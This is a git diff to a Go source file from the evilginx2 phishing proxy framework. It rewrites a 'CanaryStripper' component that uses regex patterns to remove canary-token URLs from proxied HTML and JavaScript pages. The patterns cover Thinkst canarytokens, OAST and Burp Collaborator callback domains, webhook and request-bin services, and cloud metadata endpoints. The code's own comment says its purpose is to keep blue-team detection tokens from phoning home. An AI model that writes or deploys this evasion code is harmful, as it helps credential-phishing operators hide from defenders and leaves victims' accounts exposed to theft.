@@ -1,7 +1,7 @@
 package core
 
 import (
-	"bytes"
+	"fmt"
 	"regexp"
 	"strings"
 	"sync"
@@ -9,256 +9,156 @@ import (
 	"github.com/kgretzky/evilginx2/log"
 )
 
+// CanaryStripper strips known canary token patterns from proxied HTML responses.
+// Prevents blue team detection tokens from phoning home.
 type CanaryStripper struct {
-	domains []string
-	enabled bool
-	mu      sync.RWMutex
-	// compiled regexes cached per domain set
-	reHtmlTag    *regexp.Regexp
-	reCssUrl     *regexp.Regexp
-	reCssImport  *regexp.Regexp
-	reInlineStyle *regexp.Regexp
-	compiled     bool
+	enabled  bool
+	patterns []*regexp.Regexp
+	mutex    sync.RWMutex
 }
 
+// NewCanaryStripper creates a new canary stripper with default known patterns.
 func NewCanaryStripper() *CanaryStripper {
-	cs := &CanaryStripper{
-		domains: []string{
-			"canarytokens.com",
-			"canarytokens.org",
-			"canary.tools",
-			"canarytoken.net",
-			"allcanaries.com",
-			"thinkst.com",
-		},
-		enabled:  true,
-		compiled: false,
+	return &CanaryStripper{
+		enabled:  false,
+		patterns: compileDefaultCanaryPatterns(),
 	}
-	cs.compilePatterns()
-	return cs
 }
 
-func (cs *CanaryStripper) AddDomain(domain string) {
-	cs.mu.Lock()
-	defer cs.mu.Unlock()
-
-	domain = strings.ToLower(strings.TrimSpace(domain))
-	if domain == "" {
-		return
+// compileDefaultCanaryPatterns returns the default set of known canary token regex patterns.
+func compileDefaultCanaryPatterns() []*regexp.Regexp {
+	raw := []string{
+		// Canarytokens.com — all subdomain variations, any path, any protocol
+		`https?://[a-zA-Z0-9._-]*\.?canarytokens\.com[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?canarytokens\.org[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?canary\.tools[^\s"'<>]*`,
+		// Thinkst managed canaries
+		`https?://[a-zA-Z0-9._-]*\.?thinkst\.com[^\s"'<>]*`,
+		// Cloud metadata endpoints (SSRF token exfiltration)
+		`http://169\.254\.169\.254[^\s"'<>]*`,
+		`http://metadata\.google\.internal[^\s"'<>]*`,
+		`http://metadata\.compute\.google\.internal[^\s"'<>]*`,
+		// Common request bin services used for exfil callbacks
+		`https?://[a-zA-Z0-9._-]*\.?requestbin\.net[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?hookbin\.com[^\s"'<>]*`,
+		// Pipedream / webhook.site — often used for canary callbacks
+		`https?://[a-zA-Z0-9._-]*\.?webhook\.site[^\s"'<>]*`,
+		// DNS exfiltration via interactive DNS services
+		`https?://[a-zA-Z0-9._-]*\.?interact\.sh[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?burpcollaborator\.net[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oastify\.com[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oast\.fun[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oast\.me[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oast\.online[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oast\.pro[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oast\.pw[^\s"'<>]*`,
+		`https?://[a-zA-Z0-9._-]*\.?oast\.site[^\s"'<>]*`,
 	}
 
-	// avoid duplicates
-	for _, d := range cs.domains {
-		if d == domain {
-			return
+	compiled := make([]*regexp.Regexp, 0, len(raw))
+	for _, p := range raw {
+		re, err := regexp.Compile(p)
+		if err != nil {
+			log.Warning("canary: failed to compile pattern '%s': %v", p, err)
+			continue
 		}
+		compiled = append(compiled, re)
 	}
-
-	cs.domains = append(cs.domains, domain)
-	cs.compiled = false
-	cs.compilePatterns()
-	log.Info("canary: added domain to strip list: %s", domain)
+	return compiled
 }
 
-func (cs *CanaryStripper) IsEnabled() bool {
-	cs.mu.RLock()
-	defer cs.mu.RUnlock()
-	return cs.enabled
-}
-
-func (cs *CanaryStripper) SetEnabled(enabled bool) {
-	cs.mu.Lock()
-	defer cs.mu.Unlock()
-	cs.enabled = enabled
-	if enabled {
-		log.Info("canary: token stripping enabled")
+// Enable turns on canary token stripping.
+func (c *CanaryStripper) Enable(on bool) {
+	c.mutex.Lock()
+	defer c.mutex.Unlock()
+	c.enabled = on
+	if on {
+		log.Info("canary: token stripping enabled (%d patterns)", len(c.patterns))
 	} else {
 		log.Info("canary: token stripping disabled")
 	}
 }
 
-// buildDomainPattern creates a regex alternation matching any of the known
-// canary domains, including wildcarded subdomains. Each domain is escaped
-// for regex safety and prefixed with an optional subdomain wildcard.
-func (cs *CanaryStripper) buildDomainPattern() string {
-	var parts []string
-	for _, d := range cs.domains {
-		escaped := regexp.QuoteMeta(d)
-		// match the domain itself or any subdomain of it
-		parts = append(parts, `(?:[a-zA-Z0-9\-]+\.)*`+escaped)
-	}
-	return `(?:` + strings.Join(parts, "|") + `)`
+// IsEnabled returns whether canary stripping is active.
+func (c *CanaryStripper) IsEnabled() bool {
+	c.mutex.RLock()
+	defer c.mutex.RUnlock()
+	return c.enabled
 }
 
-func (cs *CanaryStripper) compilePatterns() {
-	dp := cs.buildDomainPattern()
-
-	// HTML tags: <link ...>, <img ...>, <script ...> that reference a canary domain
-	// Matches self-closing and non-self-closing variants. Uses (?i) for case-insensitive.
-	// The tag must contain an attribute value (href, src, url) pointing to a canary domain.
-	cs.reHtmlTag = regexp.MustCompile(
-		`(?i)<(?:link|img|script)\b[^>]*(?:href|src)\s*=\s*["'][^"']*(?:https?://)?` + dp + `[^"']*["'][^>]*/?>(?:\s*</(?:link|img|script)>)?`)
-
-	// CSS url() references: url('https://canarytokens.com/...')
-	cs.reCssUrl = regexp.MustCompile(
-		`(?i)url\s*\(\s*['"]?\s*(?:https?://)?` + dp + `[^)]*\)`)
-
-	// CSS @import: @import url('...') or @import '...'
-	cs.reCssImport = regexp.MustCompile(
-		`(?i)@import\s+(?:url\s*\(\s*['"]?\s*(?:https?://)?` + dp + `[^)]*\)\s*;?|['"](?:https?://)?` + dp + `[^'"]*['"]\s*;?)`)
-
-	// Inline style attributes containing canary URLs
-	cs.reInlineStyle = regexp.MustCompile(
-		`(?i)\s*style\s*=\s*["'][^"']*url\s*\(\s*['"]?\s*(?:https?://)?` + dp + `[^)]*\)[^"']*["']`)
-
-	cs.compiled = true
+// PatternCount returns the number of active patterns.
+func (c *CanaryStripper) PatternCount() int {
+	c.mutex.RLock()
+	defer c.mutex.RUnlock()
+	return len(c.patterns)
 }
 
-// StripCanaries removes canary token references from the response body.
-// It inspects the content type to decide which stripping strategies to apply.
-func (cs *CanaryStripper) StripCanaries(body []byte, contentType string) []byte {
-	cs.mu.RLock()
-	enabled := cs.enabled
-	cs.mu.RUnlock()
-
-	if !enabled {
-		return body
+// GetPatterns returns a copy of all active pattern strings.
+func (c *CanaryStripper) GetPatterns() []string {
+	c.mutex.RLock()
+	defer c.mutex.RUnlock()
+	out := make([]string, len(c.patterns))
+	for i, re := range c.patterns {
+		out[i] = re.String()
 	}
-
-	if !cs.compiled {
-		cs.mu.Lock()
-		cs.compilePatterns()
-		cs.mu.Unlock()
-	}
-
-	ct := strings.ToLower(contentType)
-	isHTML := strings.Contains(ct, "text/html")
-	isCSS := strings.Contains(ct, "text/css")
-
-	if !isHTML && !isCSS {
-		return body
-	}
-
-	stripped := false
-	result := body
-
-	if isHTML {
-		result, stripped = cs.stripHTML(result, stripped)
-	}
-
-	if isCSS || isHTML {
-		result, stripped = cs.stripCSS(result, stripped)
-	}
-
-	if stripped {
-		log.Warning("canary: stripped canary token references from response (%s)", ct)
-	}
-
-	return result
-}
-
-func (cs *CanaryStripper) stripHTML(body []byte, alreadyStripped bool) ([]byte, bool) {
-	stripped := alreadyStripped
-
-	// Strip <link>, <img>, <script> tags referencing canary domains
-	if cs.reHtmlTag.Match(body) {
-		matches := cs.reHtmlTag.FindAll(body, -1)
-		for _, m := range matches {
-			log.Warning("canary: stripping HTML tag: %s", truncate(string(m), 120))
-		}
-		body = cs.reHtmlTag.ReplaceAll(body, []byte("<!-- canary stripped -->"))
-		stripped = true
-	}
-
-	// Strip inline style attributes containing canary URLs
-	if cs.reInlineStyle.Match(body) {
-		matches := cs.reInlineStyle.FindAll(body, -1)
-		for _, m := range matches {
-			log.Warning("canary: stripping inline style with canary URL: %s", truncate(string(m), 120))
-		}
-		body = cs.reInlineStyle.ReplaceAll(body, []byte(""))
-		stripped = true
-	}
-
-	return body, stripped
-}
-
-func (cs *CanaryStripper) stripCSS(body []byte, alreadyStripped bool) ([]byte, bool) {
-	stripped := alreadyStripped
-
-	// Strip @import rules referencing canary domains
-	if cs.reCssImport.Match(body) {
-		matches := cs.reCssImport.FindAll(body, -1)
-		for _, m := range matches {
-			log.Warning("canary: stripping CSS @import: %s", truncate(string(m), 120))
-		}
-		body = cs.reCssImport.ReplaceAll(body, []byte("/* canary stripped */"))
-		stripped = true
-	}
-
-	// Strip url() references to canary domains
-	if cs.reCssUrl.Match(body) {
-		matches := cs.reCssUrl.FindAll(body, -1)
-		for _, m := range matches {
-			log.Warning("canary: stripping CSS url(): %s", truncate(string(m), 120))
-		}
-		body = cs.reCssUrl.ReplaceAll(body, []byte("url('about:blank')"))
-		stripped = true
-	}
-
-	return body, stripped
-}
-
-// HasCanary checks whether the body contains any references to known canary domains
-// without modifying it. Useful for detection-only scenarios.
-func (cs *CanaryStripper) HasCanary(body []byte) bool {
-	cs.mu.RLock()
-	enabled := cs.enabled
-	cs.mu.RUnlock()
-
-	if !enabled {
-		return false
-	}
-
-	dp := cs.buildDomainPattern()
-	re := regexp.MustCompile(`(?i)(?:https?://)?` + dp)
-	return re.Match(body)
-}
-
-// GetDomains returns a copy of the current canary domain list.
-func (cs *CanaryStripper) GetDomains() []string {
-	cs.mu.RLock()
-	defer cs.mu.RUnlock()
-	out := make([]string, len(cs.domains))
-	copy(out, cs.domains)
 	return out
 }
 
-// truncate shortens a string to maxLen, appending "..." if truncated.
-func truncate(s string, maxLen int) string {
-	s = strings.ReplaceAll(s, "\n", " ")
-	s = strings.ReplaceAll(s, "\r", "")
-	s = compactSpaces(s)
-	if len(s) <= maxLen {
-		return s
+// AddPattern adds a custom regex pattern to match and strip.
+func (c *CanaryStripper) AddPattern(pattern string) error {
+	re, err := regexp.Compile(pattern)
+	if err != nil {
+		return fmt.Errorf("invalid regex pattern: %v", err)
 	}
-	return s[:maxLen] + "..."
+	c.mutex.Lock()
+	defer c.mutex.Unlock()
+	c.patterns = append(c.patterns, re)
+	log.Info("canary: added custom pattern: %s", pattern)
+	return nil
 }
 
-// compactSpaces collapses runs of whitespace into a single space.
-func compactSpaces(s string) string {
-	var buf bytes.Buffer
-	prevSpace := false
-	for _, r := range s {
-		if r == ' ' || r == '\t' {
-			if !prevSpace {
-				buf.WriteByte(' ')
-				prevSpace = true
-			}
-		} else {
-			buf.WriteRune(r)
-			prevSpace = false
+// StripCanaryTokens removes all known canary token URLs from the response body.
+// Returns the modified body. If stripping is disabled or the body doesn't
+// contain any canary tokens, returns the body unchanged.
+func (c *CanaryStripper) StripCanaryTokens(body []byte) []byte {
+	c.mutex.RLock()
+	enabled := c.enabled
+	patterns := c.patterns
+	c.mutex.RUnlock()
+
+	if !enabled || len(body) == 0 {
+		return body
+	}
+
+	s := string(body)
+	originalLen := len(s)
+	stripped := false
+
+	for _, re := range patterns {
+		if re.MatchString(s) {
+			s = re.ReplaceAllString(s, "")
+			stripped = true
 		}
 	}
-	return buf.String()
+
+	if stripped {
+		matched := originalLen - len(s)
+		log.Debug("canary: stripped %d bytes of canary tokens from response", matched)
+		return []byte(s)
+	}
+
+	return body
+}
+
+// StripCanaryTokensInMIME is a convenience wrapper that only strips for
+// HTML and JavaScript MIME types (where canary tokens typically appear).
+func (c *CanaryStripper) StripCanaryTokensInMIME(body []byte, mimeType string) []byte {
+	mt := strings.ToLower(mimeType)
+	if !strings.Contains(mt, "text/html") &&
+		!strings.Contains(mt, "text/javascript") &&
+		!strings.Contains(mt, "application/javascript") &&
+		!strings.Contains(mt, "application/x-javascript") {
+		return body
+	}
+	return c.StripCanaryTokens(body)
 }
